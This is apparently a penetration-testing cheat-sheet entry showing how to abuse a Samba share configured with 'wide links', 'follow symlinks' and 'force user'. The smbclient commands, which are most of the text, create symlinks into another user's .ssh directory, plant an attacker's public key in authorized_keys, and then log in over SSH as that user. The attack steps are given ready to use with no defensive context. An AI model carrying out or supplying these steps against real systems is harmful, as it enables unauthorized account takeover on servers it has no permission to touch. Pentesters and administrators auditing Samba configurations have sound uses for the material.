# Samba Wide-Link Share SSH Key Drop

A Samba share configured with `wide links = yes` and `follow symlinks = yes` follows symlinks across the filesystem. If the share also runs as a different user (`force user = <target>`), you can create a symlink into the target user's home directory.

```bash
# Check share config (if you have read access to smb.conf):
cat /etc/samba/smb.conf | grep -A10 '\[<share>\]'
# Look for: wide links = yes, follow symlinks = yes, force user = <user>

# Create a symlink to the target's .ssh directory:
smbclient //<TARGET>/<share> -U '<current-user>%<pass>'
smb> symlink /home/<target-user>/.ssh authorized_keys_link
smb> put authorized_keys_content authorized_keys_link/authorized_keys
# Or: symlink the entire .ssh directory and drop your pubkey

# Alternative: symlink to known-location file that gets processed
smb> symlink /home/<target-user>/.ssh/authorized_keys my_auth_keys
smb> put my_pubkey.pub my_auth_keys
ssh <target-user>@<TARGET>   # if share ran as that user, key is now accepted
```

The `follow symlinks = yes` combined with `wide links = yes` breaks the share root restriction, allowing traversal to any path the forced-user can access.
